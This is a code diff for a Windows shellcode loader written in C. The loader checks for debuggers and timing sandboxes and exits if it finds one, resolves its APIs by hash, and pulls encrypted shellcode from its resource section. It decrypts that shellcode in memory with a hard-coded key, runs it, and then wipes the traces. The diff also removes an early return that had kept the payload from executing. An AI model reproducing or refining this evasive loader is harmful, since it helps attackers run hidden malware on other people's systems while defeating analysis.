@@ -18,6 +18,9 @@
 // Include all typedefs and string hashes
 #include "typedefs.h"
 
+// Helper functions
+#include "helper_functions.h"
+
 // include the resource (shellcode)
 #include "resource.h"
 
@@ -29,68 +32,66 @@
 #define SUCCESS 0x0
 
 BOOL InitializeNtSyscalls();
-int _TIGER(HANDLE hMutex);
-
-// Global variable for the NTDLL config
-NTDLL_STRUCT _G_NtdllConf = { 0 };
+int _TIGER(HANDLE hMutant);
 
 // Global Variable
 NTAPI_FUNC _G_NTFUNC = { 0 };
 
 int main(void) {
 
-	//PRINTA("======== Press Enter to start ========\n");
+	NTSTATUS STATUS = NULL;
+	WCHAR MUTANTNAME[] = {'\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0};
 
-	HANDLE hMutex = _CreateMutex(L"SM0:TIG0:63772:120:WilError_03");
-	BOOL MutexRes = FALSE;
-
-	if (hMutex == ERROR_ALREADY_EXISTS) {
-		return ERR;
-	} 
-	if (hMutex != NULL) {
-#ifdef DEBUG
-		PRINTA("[+] Mutex created ! (%d) \n", GetLastError());
-#endif
+	HANDLE hMutant = _CreateMutant(MUTANTNAME);
+	if (hMutant == NULL) {
+		return -1;
 	}
 
-	//PRINTA("======== Press Enter to continue ========\n");
-	//getchar();
+	BOOL debugged = FALSE;
 
-	// ---------------------
+	// example: -10000000 = 1sec relative to current :)
+	// Used by NtDelayExecution()
+	LONGLONG sleepTimer = -50000000; 
 
-	BOOL Debug1 = AntiDebugPEBCheck();
-	BOOL Debug2 = NtGlobalFlagCheck();
-	BOOL Debug3 = DelayExecution(1);
-	if (Debug3 == TRUE) {
+	BOOL MutexRes = FALSE;
+
+	if (AntiDebugPEBCheck() != FALSE) {
+
 #ifdef DEBUG
-		PRINTA("Debugging attempted !\n");
+		PRINTA("[-] Debugging check (PEB) -> FAILED\n");
 #endif
+
+		debugged = TRUE;
+	}
+
+	if (NtGlobalFlagCheck() != FALSE) {
+
+#ifdef DEBUG
+		PRINTA("[-] Debugging check (NtGlobalFlags) -> FAILED\n");
+#endif
+		debugged = TRUE;
+	}
+
+	if (DelayExecution(sleepTimer) == FALSE) { 
+#ifdef DEBUG
+		PRINTA("[-] Debugging check (NtDelayExecution) -> FAILED\n");
+#endif
+		debugged = TRUE;
+	}
+
+	if (debugged == TRUE) {
+#ifdef DEBUG
+		PRINTA("[-] Debugger attached\n");
+#endif
+
 		return -1;
 	}
 
 #ifdef DEBUG
-		PRINTA("Real environment !\n");
+	PRINTA("[+] Debugger checks -> PASS\n");
 #endif
-	
 
-	/*
-	HMODULE hKernel32 = _GetModuleHandle(KERNEL32_HASH);
-	HMODULE hNtdll = _GetModuleHandle(NTDLL_HASH);
-	if (hKernel32 == NULL || hNtdll == NULL) {
-		//PRINTA("[-] Unable to obtain address of kernel32/ntdll in memory\n");
-		return ERR;
-	}
-	*/
-	////PRINTA("[+] Address of ->\n\t| KERNEL32 -> %#p\n\t| NTDLL -> %#p\n", hKernel32, hNtdll);
-	
-	//FARPROC ntapi = _GetProcAddress(hNtdll, NTALLOCATEVIRTUALMEMORY);
-	//FARPROC k32api = _GetProcAddress(hKernel32, VIRTUALALLOC);
-
-	////PRINTA("[+] Address of -> \n\t| NtAllocateVirtualMemory -> %#p\n\t| VirtualAlloc -> %#p\n", ntapi, k32api);
-
-	return 0;
-
-	_TIGER(hMutex);
+	_TIGER(hMutant);
 
 	return SUCCESS;
 }
@@ -138,12 +139,14 @@ BOOL InitializeNtSyscalls() {
 	return TRUE;
 }
 
-int _TIGER(HANDLE hMutex) {
+int _TIGER(HANDLE hMutant) {
 
 	t_FindResourceW FindResourceW		= (t_FindResourceW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FINDRESOURCEW_HASH);
 	t_LoadResource LoadResource			= (t_LoadResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOADRESOURCE_HASH);
 	t_LockResource LockResource			= (t_LockResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOCKRESOURCE_HASH);
 	t_SizeofResource SizeofResource		= (t_SizeofResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SIZEOFRESOURCE_HASH);
+	t_FreeResource FreeResource			= (t_FreeResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FREERESOURCE_HASH);
+	t_RtlSecureZeroMemory RtlSecureZeroMemory = (t_RtlSecureZeroMemory)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), RTLSECUREZEROMEMORY_HASH);
 
 	// Get the shellcode from resource (.rsrc)
 	HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_SCODE1), RT_RCDATA);
@@ -155,15 +158,14 @@ int _TIGER(HANDLE hMutex) {
 
 	NTSTATUS	STATUS = NULL;
 	PVOID		pAddress = NULL;
-	//SIZE_T		sSize = sizeof(Payload);
 	DWORD		dwOld = NULL;
-	HANDLE		hProcess = (HANDLE)-1,	// local process
+	HANDLE		hProcess = NtCurrentProcess(),	// local process
 				hThread = NULL;
 
 
 	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
 	SIZE_T sizeKey = sizeof(key);
-
+		
 
 	// initializing the used syscalls
 	if (!InitializeNtSyscalls()) {
@@ -183,13 +185,14 @@ int _TIGER(HANDLE hMutex) {
 	}
 
 	// copying the payload
-	if (memcpy(pAddress, payload, sSize)) {
+	if (ZwMoveMemory(pAddress, payload, sSize) != NULL) {
 #ifdef DEBUG
-		PRINTA("[+] Memory moved ! (ADDR: %#p)\n", pAddress);
+		PRINTA("[+] Memory moved ! (ADDR: 0x%p)\n", pAddress);
 #endif
+		
 		if ((STATUS = CryptMemory032(pAddress, sSize, key, sizeKey)) != 0x00) {
 #ifdef DEBUG
-			PRINTA("Decryption Failed ! (STATUS 0x%0.8X)\n", STATUS);
+			PRINTA("[-] Decryption Failed ! (STATUS 0x%0.8X)\n", STATUS);
 #endif
 			return -1;
 		}
@@ -226,12 +229,13 @@ int _TIGER(HANDLE hMutex) {
 #endif
 		return -1;
 	}
-#ifdef DEBUG
-	PRINTA("[#] Press <Enter> To Quit ... ");
-#endif
 
-	HANDLE MutexRes = _DestroyMutex(hMutex);
-	if (MutexRes != TRUE) {
+	// Free the .rsrc section with the shellcode
+	RtlSecureZeroMemory(payload, sSize);
+	FreeResource(res);
+
+	BOOL MutantRes = _DestroyMutant(hMutant);
+	if (MutantRes != TRUE) {
 		return -1;
 	}
 }
